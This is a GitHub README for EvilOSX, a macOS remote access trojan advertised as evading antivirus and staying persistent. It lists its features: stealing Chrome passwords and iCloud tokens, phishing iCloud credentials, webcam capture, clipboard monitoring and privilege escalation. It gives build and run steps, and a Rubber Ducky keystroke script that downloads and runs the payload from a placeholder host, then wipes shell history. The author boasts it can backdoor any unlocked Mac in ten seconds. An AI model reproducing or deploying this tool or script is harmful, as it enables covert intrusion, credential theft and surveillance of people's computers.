<h1 align="center">
  <br>
  <a href="https://github.com/Marten4n6/EvilOSX"><img src="https://i.imgur.com/qiAJP95.png" alt="EvilOSX" width="250"></a>
  <br>
  EvilOSX
  <br>
</h1>

<h4 align="center">A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.</h4>

<p align="center">
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/issues">
    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/pulls">
      <img src="https://img.shields.io/badge/contributions-welcome-orange.svg">
  </a>
</p>

---

## Features

- Emulate a simple terminal instance
- Undetected by anti-virus (OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads, [HTTPS](https://en.wikipedia.org/wiki/HTTPS) communication)
- Multi-threaded
- No client dependencies (pure python)
- Persistent
- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/modules/template.py) system
- Retrieve Chrome passwords
- Retrieve iCloud tokens and contacts
- [Phish](https://en.wikipedia.org/wiki/Phishing) for iCloud passwords via iTunes
- Download and upload files
- Take a picture using the webcam
- iTunes iOS backup enumeration
- Retrieve or monitor the clipboard
- Retrieve browser history (Chrome and Safari)
- Attempt to get root via local privilege escalation
- Auto installer, simply run EvilOSX on your target and the rest is handled automatically

## How To Use

```bash
# Install urwid (required for the server GUI)
$ sudo pip install urwid

# Clone or download this repository
$ git clone https://github.com/Marten4n6/EvilOSX

# Go into the repository
$ cd EvilOSX

# Build EvilOSX which runs on your target
$ python builder.py

# Start listening for connections
$ python server/server.py

# Lastly, run the built EvilOSX on your target.
```
**Because payloads are created unique to the target system (automatically by the server), the server must be running when any client connects for the first time.**

![](https://i.imgur.com/IImALFV.png)
![](https://i.imgur.com/lC8XtlJ.png)

## Motivation

This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
```
REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
REM Also see https://ducktoolkit.com/vidpid/

DELAY 1000
GUI SPACE
DELAY 500
STRING Termina
DELAY 1000
ENTER
DELAY 1500

REM Kill all terminals after x seconds
STRING screen -dm bash -c 'sleep 6; killall Terminal'
ENTER

STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
ENTER
```
- Takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
- Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise. <br/>
- To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/). Aluminum Keyboard (ISO) is probably the one you are looking for.

## Versioning

EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
Server and client releases will be numbered with the follow format:
```
<major>.<minor>.<patch>
```

And constructed with the following guidelines:
- Breaking backward compatibility bumps the major
- New additions without breaking backward compatibility bumps the minor
- Bug fixes and misc changes bump the patch

For more information on SemVer, please visit https://semver.org/.

## Issues

Feel free to submit any issues or feature requests.

## Credits

- The awesome [Empire](https://github.com/EmpireProject) project
- Shoutout to [Patrick Wardle](https://twitter.com/patrickwardle) for his awesome talks, check out [Objective-See](https://objective-see.com/)
- [manwhoami](https://github.com/manwhoami) for his projects: [OSXChromeDecrypt](https://github.com/manwhoami/OSXChromeDecrypt), [MMeTokenDecrypt](https://github.com/manwhoami/MMeTokenDecrypt), [iCloudContacts](https://github.com/manwhoami/iCloudContacts)
- The slowloris module is pretty much copied from [PySlowLoris](https://github.com/ProjectMayhem/PySlowLoris)
- [urwid](http://urwid.org/) and [this code](https://github.com/izderadicka/xmpp-tester/blob/master/commander.py) which saved me a lot of time with the GUI
- Logo created by [motusora](https://www.behance.net/motusora)

## License

[GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
